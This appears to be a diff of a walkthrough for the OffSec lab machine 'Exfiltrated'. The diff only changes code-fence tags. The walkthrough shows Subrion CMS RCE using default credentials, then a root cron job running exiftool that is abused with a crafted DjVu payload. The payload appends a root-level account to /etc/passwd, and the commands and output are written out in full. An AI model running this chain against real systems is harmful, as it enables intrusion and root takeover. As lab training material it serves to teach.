@@ -3,7 +3,7 @@
 # 🐧Exfiltrated🐧
 ## Enumeration
 Nmap
-```
+```console
 $ nmap -p- -T4 -sV 192.168.242.163
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-31 21:26 AEDT
 Warning: 192.168.242.163 giving up on port because retransmission cap hit (6).
@@ -22,7 +22,7 @@ We search it from google and there is a script for Subrion CMS 4.2.1 - Arbitrary
 https://www.exploit-db.com/exploits/49876  
 
 We then run it by using default credential admin admin
-```
+```console
 $ python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
 [+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 
 
@@ -44,7 +44,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ## Privilege Escalation  
 
 We found that there is a cron job running every minute by root
-```
+```console
 $ cat /etc/crontab  
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
@@ -70,7 +70,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 * *     * * *   root    bash /opt/image-exif.sh
 ```
 The cron job is use to automate the extraction of metadata from images uploaded to a web server
-```
+```console
 $ cat /opt/image-exif.sh  
 #! /bin/bash
 #07/06/18 A BASH script to collect EXIF metadata 
@@ -97,28 +97,28 @@ we can use it to add a root user in the payload and login as root shell
 https://www.exploit-db.com/exploits/50911  
 
 We make a password
-```
+```console
 openssl passwd password123
 $1$l9kweacK$bTMwIAX37KSVy6.PUHEhk0
 ```
 Then make to payload to add user root2
-```
+```console
 $ cat payload          
 (metadata "\c${system('echo \"root2:$1$l9kweacK$bTMwIAX37KSVy6.PUHEhk0:0:0:root:/root:/bin/bash\" >> /etc/passwd')};")
 ```
 converted the payload to bzz format and embedded it using djvumake
-```
+```console
 $ bzz payload payload.bzz
 $ djvumake exploit.jpg.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
 ```
 upload to the image loaction where the cron job execute at /var/www/html/subrion/uploads  
 After one minute the user root2 have been add to root group with our password
-```
+```console
 $ cat /etc/passwd
 root2:$1$l9kweacK$bTMwIAX37KSVy6.PUHEhk0:0:0:root:/root:/bin/bash
 ```
 ssh to the root2
-```
+```console
 $ ssh root2@192.168.156.163
 root@exfiltrated:~# id
 uid=0(root) gid=0(root) groups=0(root)
